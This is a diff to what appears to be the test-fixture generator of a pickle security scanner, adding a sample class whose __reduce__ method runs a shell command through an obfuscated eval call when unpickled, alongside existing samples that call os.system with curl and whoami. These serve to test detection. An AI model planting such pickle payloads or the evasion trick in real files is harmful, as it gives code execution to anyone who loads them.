@@ -1,4 +1,5 @@
 import bdb
+import builtins
 import cProfile
 import http.client
 import io
@@ -147,6 +148,16 @@ class Malicious22:
         from numpy.testing._private.utils import runstring
 
         return runstring, ("import os; os.system('curl https://example.invalid')", {})
+
+
+class EvilClass:
+    @staticmethod
+    def _obfuscated_eval(payload):
+        getattr(builtins, "eval")(payload)
+
+    def __reduce__(self):
+        payload = "__import__('os').system('echo \"successful attack\"')"
+        return self._obfuscated_eval, (payload,)
 
 
 _payload = "__import__('os').system('whoami')"
@@ -729,6 +740,7 @@ def initialize_pickle_files():
 
     initialize_pickle_file(f"{_root_path}/data2/malicious21.pkl", Malicious21(), 4)
     initialize_pickle_file(f"{_root_path}/data2/malicious22.pkl", Malicious22(), 4)
+    initialize_pickle_file(f"{_root_path}/data2/GHSA-9m3x-qqw2-h32h.pkl", EvilClass(), 4)
 
     # https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9gvj-pp9x-gcfr
     initialize_data_file(
